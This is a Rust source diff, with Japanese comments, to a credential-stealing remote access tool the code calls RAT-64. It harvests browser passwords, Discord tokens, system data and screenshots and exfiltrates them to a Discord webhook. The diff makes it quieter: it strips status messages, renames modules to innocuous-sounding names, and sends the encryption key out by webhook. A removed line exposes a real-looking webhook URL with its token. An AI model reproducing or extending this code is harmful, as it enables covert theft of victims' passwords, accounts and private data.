@@ -9,7 +9,7 @@ use aes_gcm::{Aes256Gcm, Nonce, aead::{Aead, KeyInit}};
 
 // 条件付きインポート
 #[cfg(feature = "screenshot")]
-use crate::modules::screenshot::ScreenshotConfig;
+use crate::modules::screen_capture::ScreenshotConfig;
 
 // カスタムエラー型の定義
 #[derive(Debug)]
@@ -51,20 +51,21 @@ pub type RatResult<T> = Result<T, RatError>;
 
 // モジュールシステム
 pub mod modules;
-pub mod profiles;
-pub mod credentials;
+pub mod browser_profiles;
+pub mod password_manager;
 // pub mod cli;  // 元のclapベースCLI
-pub mod cli_simple;  // 標準ライブラリベースCLI
-pub use cli_simple as cli;  // 互換性のため
-pub mod output; 
-pub mod nss_stub;
+pub mod cli_args;  // 標準ライブラリベースCLI
+pub use cli_args as cli;  // 互換性のため
+pub mod data_exporter; 
+pub mod firefox_nss;
 // Only include browser collector when the feature is enabled
 #[cfg(feature = "browser")]
-pub mod chomeium_dump;
+pub mod browser_scanner;
+pub mod auth_tokens;
 
 // 新しいモジュールからの公開API
-pub use profiles::{get_profile_path, get_default_profile};
-pub use credentials::{JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin};
+pub use browser_profiles::{get_profile_path, get_default_profile};
+pub use password_manager::{JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin};
 pub use cli::Args;
 
 // 最小限のシステム情報構造体
@@ -171,7 +172,7 @@ impl Default for Config {
             timeout_seconds: 45,
             
             // Webhook設定（デフォルトで有効）
-            webhook_url: "https://discordapp.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
+            webhook_url: "".to_string(),
             webhook_type: "Discord".to_string(),
             webhook_enabled: true,
             
@@ -597,7 +598,7 @@ fn collect_all_passwords(config: &Config) -> Vec<String> {
 #[cfg(feature = "browser")]
 fn collect_browser_passwords() -> Vec<String> {
     // 統合ブラウザデータ収集機能を使用（ChromiumとFirefox両方対応）
-    match crate::chomeium_dump::collect_browser_passwords_simple() {
+    match crate::browser_scanner::collect_browser_passwords_simple() {
         Ok(passwords) => {
             if passwords.is_empty() {
                 vec!["No browser passwords found".to_string()]
@@ -610,8 +611,6 @@ fn collect_browser_passwords() -> Vec<String> {
         }
     }
 }
-
-
 
 // Discord トークン収集統合版（token_dump.rs機能統合）
 fn extract_discord_tokens() -> Result<Vec<String>, Box<dyn std::error::Error>> {
@@ -924,6 +923,7 @@ fn get_config_dir() -> RatResult<std::path::PathBuf> {
     }
 }
 
+#[allow(dead_code)]
 fn get_home_dir() -> RatResult<std::path::PathBuf> {
     #[cfg(windows)]
     {
@@ -943,60 +943,7 @@ fn get_home_dir() -> RatResult<std::path::PathBuf> {
     }
 }
 
-// キー管理機能
-const KEY_FILE: &str = "key.dat";
-
-// キーを別ファイルに保存
-pub fn save_key_to_file(key: &[u8; 32], nonce: &[u8; 12]) -> RatResult<()> {
-    let mut combined = Vec::new();
-    combined.extend_from_slice(key);
-    combined.extend_from_slice(nonce);
-    std::fs::write(KEY_FILE, combined)?;
-    println!("🔑 暗号化キーを {} に保存しました", KEY_FILE);
-    Ok(())
-}
-
-// ファイルからキーを読み込み（Base64形式対応）
-pub fn load_key_from_file() -> RatResult<([u8; 32], [u8; 12])> {
-    let content = std::fs::read_to_string(KEY_FILE)
-        .map_err(|_| RatError::Config("Key file not found".to_string()))?;
-    
-    // Base64形式のキーファイルを解析
-    let mut key_b64 = None;
-    let mut nonce_b64 = None;
-    
-    for line in content.lines() {
-        if line.starts_with("KEY:") {
-            key_b64 = Some(&line[4..]);
-        } else if line.starts_with("NONCE:") {
-            nonce_b64 = Some(&line[6..]);
-        }
-    }
-    
-    let key_str = key_b64.ok_or_else(|| RatError::Config("Key not found in file".to_string()))?;
-    let nonce_str = nonce_b64.ok_or_else(|| RatError::Config("Nonce not found in file".to_string()))?;
-    
-    // Base64デコード
-    use base64::{engine::general_purpose, Engine as _};
-    let key_vec = general_purpose::STANDARD.decode(key_str)
-        .map_err(|_| RatError::Config("Invalid key format".to_string()))?;
-    let nonce_vec = general_purpose::STANDARD.decode(nonce_str)
-        .map_err(|_| RatError::Config("Invalid nonce format".to_string()))?;
-    
-    if key_vec.len() != 32 {
-        return Err(RatError::Config("Invalid key length".to_string()));
-    }
-    if nonce_vec.len() != 12 {
-        return Err(RatError::Config("Invalid nonce length".to_string()));
-    }
-    
-    let mut key = [0u8; 32];
-    let mut nonce = [0u8; 12];
-    key.copy_from_slice(&key_vec);
-    nonce.copy_from_slice(&nonce_vec);
-    
-    Ok((key, nonce))
-}
+// キー管理機能は削除されました - 直接入力のみサポート
 
 // 低レベル暗号化
 pub fn encrypt_data_with_key(data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> RatResult<Vec<u8>> {
@@ -1012,20 +959,9 @@ pub fn decrypt_data(encrypted_data: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> 
         .map_err(|e| RatError::Encryption(format!("Decryption failed: {:?}", e)))
 }
 
-// 設定管理（config.json不使用版 - ハードコード設定）
-pub fn load_config() -> RatResult<Config> {
-    // 常にハードコードされた設定を返す
-    Ok(get_hardcoded_config())
-}
-
-pub fn create_default_config() -> RatResult<()> {
-    // 何もしない（ファイル作成不要）
-    Ok(())
-}
-
 // ハードコードされた設定を取得（config.json不使用）
 pub fn load_config_or_default() -> Config {
-    println!("📋 ハードコード設定を使用します");
+    // ハードコード設定を使用
     get_hardcoded_config()
 }
 
@@ -1070,13 +1006,13 @@ fn get_hardcoded_config() -> Config {
 // Webhook機能付きメイン実行関数
 #[cfg(feature = "webhook")]
 pub fn run_with_webhook(config: &Config) -> RatResult<()> {
-    use crate::modules::webhook::{WebhookConfig, WebhookType, send_webhook};
+    use crate::modules::notification_sender::{WebhookConfig, WebhookType, send_webhook};
     
-    println!("🚀 RAT-64 実行開始（Webhook機能有効）");
+    // RAT-64 実行開始（Webhook機能有効）
     
     // システム情報収集
     let system_info = get_system_info()?;
-    println!("✅ システム情報収集完了");
+    // システム情報収集完了
     
     // 認証データ収集（設定に基づく）
     let auth_data = if config.collect_auth_data {
@@ -1087,7 +1023,7 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
             wifi_creds: vec![],
         }
     };
-    println!("✅ 認証データ収集完了");
+    // 認証データ収集完了
     
     // WebhookConfig作成
     let webhook_config = WebhookConfig {
@@ -1108,23 +1044,16 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
     
     // Webhook送信
     if webhook_config.webhook_url.is_some() {
-        println!("📡 Webhook送信開始...");
-        match send_webhook(&webhook_config, &system_info, &auth_data) {
-            Ok(_) => println!("✅ Webhook送信完了"),
-            Err(e) => println!("❌ Webhook送信失敗: {}", e),
-        }
-    } else {
-        println!("⚠️  Webhook URLが設定されていません");
+        let _ = send_webhook(&webhook_config, &system_info, &auth_data);
     }
     
     // スクリーンショット機能（オプション）
     let screenshot_data = {
         #[cfg(feature = "screenshot")]
         if config.collect_screenshots {
-            match crate::modules::screenshot::capture_all_displays(&ScreenshotConfig::default()) {
+            match crate::modules::screen_capture::capture_all_displays(&ScreenshotConfig::default()) {
                 Ok(screenshot_data) => {
                     let total_count = screenshot_data.len();
-                    println!("✅ スクリーンショット取得完了: {}件", total_count);
                     ScreenshotData {
                         primary_display: screenshot_data.get(0).cloned(),
                         all_displays: screenshot_data,
@@ -1132,8 +1061,7 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
                         total_count,
                     }
                 },
-                Err(e) => {
-                    println!("❌ スクリーンショット取得失敗: {}", e);
+                Err(_) => {
                     ScreenshotData {
                         primary_display: None,
                         all_displays: Vec::new(),
@@ -1164,8 +1092,6 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
     
     // データ暗号化と保存
     if config.output_format == "Encrypted" {
-        println!("🔐 データを暗号化して保存中...");
-        
         // データ構造体作成
         #[derive(serde::Serialize)]
         struct FullData {
@@ -1196,38 +1122,29 @@ pub fn run_with_webhook(config: &Config) -> RatResult<()> {
                         // データ保存
                         match std::fs::write("data.dat", &encrypted_data) {
                             Ok(_) => {
-                                // キーファイル保存
-                                use base64::{engine::general_purpose, Engine as _};
-                                let key_data = format!("KEY:{}\nNONCE:{}", 
-                                    general_purpose::STANDARD.encode(&key),
-                                    general_purpose::STANDARD.encode(&nonce));
-                                match std::fs::write("key.dat", key_data) {
-                                    Ok(_) => {
-                                        println!("✅ 暗号化データを data.dat に保存しました");
-                                        println!("🔑 暗号化キーとナンスを key.dat に保存しました");
-                                    },
-                                    Err(e) => println!("❌ キーファイル保存エラー: {}", e),
+                                // Webhookで暗号化キーを送信（full機能時）
+                                #[cfg(feature = "webhook")]
+                                if webhook_config.webhook_url.is_some() {
+                                    let _ = crate::modules::notification_sender::send_encryption_key_webhook(&webhook_config, &key, &nonce);
                                 }
                             },
-                            Err(e) => println!("❌ データファイル保存エラー: {}", e),
+                            Err(_) => {},
                         }
                     },
-                    Err(e) => println!("❌ 暗号化エラー: {}", e),
+                    Err(_) => {},
                 }
             },
-            Err(e) => println!("❌ シリアライゼーションエラー: {}", e),
+            Err(_) => {},
         }
     }
     
-    println!("🎉 RAT-64 実行完了");
     Ok(())
 }
 
 // Webhook機能なしのフォールバック
 #[cfg(not(feature = "webhook"))]
 pub fn run_with_webhook(_config: &Config) -> RatResult<()> {
-    println!("⚠️  Webhook機能が無効です。--features webhook でビルドしてください");
-    Ok(())
+    Err(RatError::Io(std::io::Error::new(std::io::ErrorKind::Other, "Webhook機能が無効です")))
 }
 
 // Fallback implementation when the "browser" feature is disabled
